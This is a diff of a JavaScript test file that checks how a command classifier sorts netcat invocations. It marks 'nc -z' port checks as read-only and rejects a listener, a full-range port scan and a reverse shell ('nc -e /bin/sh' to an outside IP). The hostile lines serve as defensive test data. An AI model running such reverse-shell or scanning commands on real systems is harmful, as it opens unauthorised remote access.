@@ -56,6 +56,10 @@ describe('v1539 Befehlsklassen', () => {
       expect(befehlsklasse(b), b).toBe('lesen');
     }
   });
+  it('v1603: nc -z als Verbindungstest lesen, alles andere mit nc nicht', () => {
+    for (const b of ['nc -z 192.168.1.211 5432', 'nc -zv -w 3 192.168.1.211 5443', 'nc -z db.local 5432']) expect(befehlsklasse(b), b).toBe('lesen');
+    for (const b of ['nc 192.168.1.211 5432', 'nc -l 4444', 'nc -e /bin/sh 1.2.3.4 4444', 'nc -z 1.2.3.4 1-65535', 'nc -z 1.2.3.4 22 80']) expect(befehlsklasse(b), b).not.toBe('lesen');
+  });
   it('v1602: Umzugserhebung (Realfall 23.10.) — Filter, Ports, Bind-Mounts, Links, Compose-Labels lesen; Env/Labels/Cmd nicht', () => {
     for (const b of [
       `docker ps -a --filter name=pgadmin4-pgadmin-1 --format '{{.Names}} / {{.Ports}}'`,
